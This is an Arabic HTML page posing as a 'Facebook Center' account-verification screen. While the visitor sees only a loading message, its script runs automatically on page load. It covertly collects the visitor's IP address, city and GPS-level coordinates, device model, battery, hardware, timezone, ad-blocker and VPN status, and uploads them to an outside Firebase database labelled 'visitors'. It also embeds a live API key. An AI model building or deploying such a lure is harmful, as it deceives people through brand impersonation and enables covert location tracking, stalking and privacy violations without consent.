<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز فيسبوك</title>

    <!-- Firebase SDK (Compat v9/v10 for Web) -->
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #0d1117;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .main-card {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 30px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        h1 {
            color: #00ff66;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }

        p {
            color: #8b949e;
            font-size: 0.95rem;
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <h1>مركز فيسبوك</h1>
        <p>جاري التحقق من الحساب...</p>
    </div>

    <!-- سكريبت التتبع المتقدم واستخراج البصمة الرقمية -->
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD60g3bc-e6h9JMRUR3eKcD5oRO2rAb4vQ",
            authDomain: "beauty-store-4f012.firebaseapp.com",
            projectId: "beauty-store-4f012",
            storageBucket: "beauty-store-4f012.firebasestorage.app",
            messagingSenderId: "1053116874470",
            appId: "1:1053116874470:web:32a41e8ce3e089d1920527"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.firestore();

        // 1. كشف استخدام AdBlocker
        async function checkAdBlocker() {
            try {
                const googleAds = new Request('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
                await fetch(googleAds);
                return false;
            } catch (e) {
                return true;
            }
        }

        // 2. كشف حالة ونسبة البطارية
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'متصل بالشاحن ⚡' : 'غير متصل 🔋'
                    };
                } catch (e) {
                    return { level: 'غير معروف', charging: 'غير معروف' };
                }
            }
            return { level: 'غير مدعوم', charging: 'غير مدعوم' };
        }

        // 3. كشف نوع الجهاز وموديله
        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const match = ua.match(/Build\/([a-zA-Z0-9_-]+)/);
                return { type: 'هاتف ذكي (Android)', detail: match ? match[1] : 'Android Device' };
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                return { type: 'هاتف/آيباد (iOS)', detail: 'Apple Device' };
            } else if (/Windows/i.test(ua)) {
                return { type: 'كمبيوتر (Windows)', detail: 'PC / Laptop' };
            } else if (/Macintosh/i.test(ua)) {
                return { type: 'كمبيوتر (Mac)', detail: 'MacBook / Mac' };
            } else if (/Linux/i.test(ua)) {
                return { type: 'نظام (Linux)', detail: 'Linux PC' };
            }
            return { type: 'جهاز غير معروف', detail: 'Unknown' };
        }

        // 4. جمع وإرسال البيانات الأمنية والجغرافية
        async function collectVisitorIntelligence() {
            try {
                // جلب بيانات الشبكة والـ IP
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // فحص البطارية ومانع الإعلانات ونوع الجهاز
                const hasAdBlock = await checkAdBlocker();
                const batteryInfo = await getBatteryInfo();
                const deviceMeta = getDeviceModel();

                // تحديد التهديدات ونسبة المخاطر
                const org = (ipData.org || '').toLowerCase();
                const isVpnOrProxy = org.includes('vpn') || org.includes('proxy') || org.includes('hosting') || org.includes('scaleway') || org.includes('digitalocean') || org.includes('linode');
                const riskLevel = isVpnOrProxy ? 'HIGH' : 'LOW';

                // بناء السجل المتقدم
                const visitorPayload = {
                    ip: ipData.ip || 'Unknown IP',
                    country: ipData.country_name || 'غير معروف',
                    region: ipData.region || 'غير معروف',
                    city: ipData.city || 'غير معروف',
                    zip: ipData.postal || 'غير متوفر',
                    latitude: ipData.latitude || null,
                    longitude: ipData.longitude || null,
                    isp: ipData.org || 'غير معروف',
                    network_type: ipData.network || 'غير معروف',
                    device_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف',
                    device_language: navigator.language || 'غير معروف',
                    
                    // بيانات الجهاز والبيئة الجديدة
                    device_type: deviceMeta.type,
                    device_model: deviceMeta.detail,
                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
                    cpu_cores: navigator.hardwareConcurrency || 'غير معروف',
                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
                    battery_level: batteryInfo.level,
                    battery_charging: batteryInfo.charging,
                    adblock_active: hasAdBlock ? 'مفعل 🛡️' : 'غير مفعل ❌',
                    is_vpn: isVpnOrProxy,
                    risk_score: riskLevel,
                    user_agent: navigator.userAgent,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                };

                // إرسال البيانات إلى Firestore
                await db.collection("visitors").add(visitorPayload);
                console.log("[+] Visitor Intelligence Logged Successfully.");

            } catch (err) {
                console.error("[-] Error logging visitor data: ", err);
            }
        }

        // تنفيذ السكريبت تلقائياً فور تجهيز عناصر الصفحة
        window.addEventListener('DOMContentLoaded', collectVisitorIntelligence);
    </script>

    <!-- استدعاء ملف script.js الخارجي الفرعي (إن وجد) -->
    <script src="script.js?v=2.0"></script>

</body>
</html>
